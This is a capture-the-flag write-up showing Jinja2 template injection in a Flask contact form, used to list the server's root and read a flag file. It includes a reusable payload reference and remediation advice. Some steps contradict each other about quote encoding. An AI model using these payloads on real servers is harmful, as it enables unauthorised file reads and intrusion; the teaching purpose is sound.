# 🔨 HammerHopper — Jinja2 SSTI to Flag

![Hammer](https://images.unsplash.com/photo-1586864387967-d02ef85d93e8?w=800&h=300&fit=crop)
> *"What the form does with your name on the way back to you is the part nobody reviewed."*

---

## 📋 Challenge Brief

| Field | Detail |
|---|---|
| **Challenge** | HammerHopper — Webverse Pro |
| **Difficulty** | Medium |
| **CVE / Vuln Class** | Server-Side Template Injection (SSTI) — Jinja2/Flask |
| **Flag Format** | `WEBVERSE{...}` |
| **Target URL** | `https://f19b347b-4037-hammerhopper-3bab3.events.webverselabs-pro.com/` |

### Scenario

> HammerHopper is an established builder with a brand-new website. A junior put it together over a long weekend with a framework they were still learning. The pages look sharp and the contact form works. What the form does with your name on the way back to you is the part nobody reviewed.

---

## 🔍 Phase 1: Reconnaissance

### Landing Page

The site presents a polished construction company front-end with a clean **nav**, **hero section**, **stats**, **services**, **portfolio**, and a **contact page**.

![Construction Site](https://images.unsplash.com/photo-1541888946425-d81bb97a5e5b?w=600&h=250&fit=crop)

### Key Discovery — `/contact` Page

The contact form has four fields:

```
┌─────────────────────────────────────┐
│  Your name     [________________]  │
│  Email         [________________]  │
│  Phone         [________________]  │
│  Project details                   │
│  [________________________________]│
│  [████████████ Send enquiry ██████] │
└─────────────────────────────────────┘
```

On submission, it POSTs to `/contact` and renders a thank-you page.

---

## 🕵️ Phase 2: Vulnerability Discovery

### Step 1 — Identify Reflection Point

A simple test submission reveals the `name` field is reflected directly into an `<h1>` tag:

```http
POST /contact HTTP/2
Host: f19b347b-4037-hammerhopper-3bab3.events.webverselabs-pro.com

name=JohnDoe&email=x@x.com&phone=555&message=test
```

**Response:**
```html
<h1 class="thanks-h">Thank you JohnDoe, we'll get back to you!</h1>
```

![Target Acquired](https://media2.giphy.com/media/v1.Y2lkPTc5MGI3NjExaWlkajB3bm14dGI5N2VnZjEwZ3RoMTBxOWk3bzRwMjg3Mmxha3N3ciZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/3o7btPCcdNniyf0ArS/giphy.gif)

### Step 2 — Probe for XSS

Try a basic `<script>` injection:

```http
name=<script>alert(1)</script>
```

**Result:** Unsanitized — the script tag passes straight through. **This is reflective XSS.**

But wait — CSS comments reveal a critical constraint:

```css
/* Self-hosted fonts (container egress is dropped, so no CDN). */
```

🔥 **The container has no outbound internet.** Standard XSS exfiltration won't work.

### Step 3 — Test SSTI

Since the `name` reflects server-side and the brief says "a framework they were still learning," let's test for **Server-Side Template Injection**:

| Payload | Result | Verdict |
|---|---|---|
| `{{7*7}}` | `Thank you 49` | ✅ **Jinja2 SSTI Confirmed** |
| `${7*7}` | `Thank you ${7*7}` | ❌ Not FreeMarker/Java |
| `{{7*"7"}}` | `Thank you 7777777` | ✅ String multiplication in Jinja2 |
| `{{config}}` | Flask config dump | ✅ Full **Flask config leaked** |

![SSTI Confirmed](https://images.unsplash.com/photo-1633356122544-f134324a6cee?w=600&h=250&fit=crop)

The `{{config}}` dump reveals:

```
DEBUG: False
SECRET_KEY: None
SESSION_COOKIE_HTTPONLY: True
```

---

## ⚡ Phase 3: Exploitation

### The Quote Problem

Single and double quotes are HTML-encoded (`&#39;` and `&#34;`), breaking direct function calls:

```jinja
{{config.__class__.__init__.__globals__["os"].popen("id").read()}}
<!-- FAILS — quotes encoded ⟹ template output literally -->
```

### Bypass Strategy — `request.args`

Pass strings via URL parameters to avoid inline quotes:

```http
POST /contact?g=__getitem__&k=os HTTP/2
name={{cycler.__init__.__globals__|attr(request.args.g)(request.args.k)}}
```

### Step by Step Chain

**1. Verify `__globals__` is accessible:**

```jinja
{{cycler.__init__.__globals__|length}}
<!-- Output: 50 -->
```

**2. Check available modules:**

```jinja
{{cycler.__init__.__globals__|list}}
<!-- Output: ['__name__', '__doc__', ..., 'os', 're', 'json', ...] -->
```

**3. Import `os` module:**

```jinja
{{config.__class__.__init__.__globals__.__getitem__('os')}}
<!-- Output: <module 'os' (frozen)> -->
```

**4. List root directory:**

```jinja
{{config.__class__.__init__.__globals__.__getitem__('os').listdir('/')}}
```

**Result:**
```
['opt', 'mnt', 'proc', 'var', 'root', 'lib', 'usr', 'tmp', 'sys', 'sbin',
 'bin', 'dev', 'etc', 'lib64', 'srv', 'run', 'media', 'home', 'boot',
 'flag.txt', 'app', '.dockerenv', 'entrypoint.sh']
```

🎯 **`flag.txt` spotted at `/`!**

### The Sandbox Problem

High-level functions are blocked:

| Attempt | Result |
|---|---|
| `open('/flag.txt').read()` | ❌ Blocked |
| `os.popen('cat /flag.txt').read()` | ❌ Blocked (frozen module) |
| `os.system('cat /flag.txt')` | ❌ Blocked |
| `subprocess.check_output(...)` | ❌ Blocked |

### The Bypass — Low-Level File I/O

`os.open()` + `os.read()` slips past the sandbox:

```jinja
{{config.__class__.__init__.__globals__.__getitem__('os').read(
  config.__class__.__init__.__globals__.__getitem__('os').open('/flag.txt', 0),
  4096
)}}
```

| Component | Meaning |
|---|---|
| `os.open('/flag.txt', 0)` | Opens file in read-only mode (`0` = `O_RDONLY`) |
| `os.read(fd, 4096)` | Reads up to 4096 bytes from the file descriptor |

**🚩 Output:**
```
b'WEBVERSE{a85***********************************e4}\n'
```

---

## 🏁 Flag Retrieved

```
WEBVERSE{a85***********************************e4}
```

---

## 🧠 Key Takeaways

### Vulnerability Chain

```
Unsanitized name field
        ↓
Jinja2 SSTI ({{7*7}} confirmed)
        ↓
os.listdir('/') reveals flag.txt
        ↓
os.open() + os.read() bypasses sandbox
        ↓
🚩 Flag captured
```

### Why It Worked

| Factor | Detail |
|---|---|
| **Rookie Mistake** | Using `render_template_string()` with unsanitized user input instead of `render_template()` |
| **Frameworks Matter** | Flask+Jinja2 with `render_template_string()` is dangerous — the template processing happens after variable substitution |
| **Sandbox Gaps** | The Jinja2 sandbox blocked `open()`, `system()`, `popen()`, and `subprocess`, but missed `os.open()` + `os.read()` — low-level POSIX file I/O |
| **Container Constraints** | Egress was dropped, preventing standard XSS exfiltration, but SSTI doesn't need egress — it reads directly from the server's filesystem |

### Remediation

```python
# ❌ Vulnerable
from flask import render_template_string
return render_template_string(f"Thank you {request.form['name']}, ...")

# ✅ Safe
from flask import render_template
return render_template("thanks.html", name=request.form['name'])
```

### Rule of Thumb

> 📐 **Never concatenate user input into a template string.** Always pass it as a **context variable** to a pre-compiled template.

---

## 📂 Payload Reference

### Liveness Detection
```http
POST /contact
name={{7*7}}&email=x@x.com&phone=555&message=test
```

### Directory Listing
```http
POST /contact
name={{config.__class__.__init__.__globals__.__getitem__('os').listdir('/')}}
```

### Flag Retrieval (Final Payload)
```http
POST /contact
name={{config.__class__.__init__.__globals__.__getitem__('os').read(
  config.__class__.__init__.__globals__.__getitem__('os').open('/flag.txt',0),
  4096
)}}
```

---

*Happy Hunting — always check what the form does with your name.* 🔨

![Construction Hard Hat](https://images.unsplash.com/photo-1578996952315-d5f9e55b101f?w=400&h=200&fit=crop)
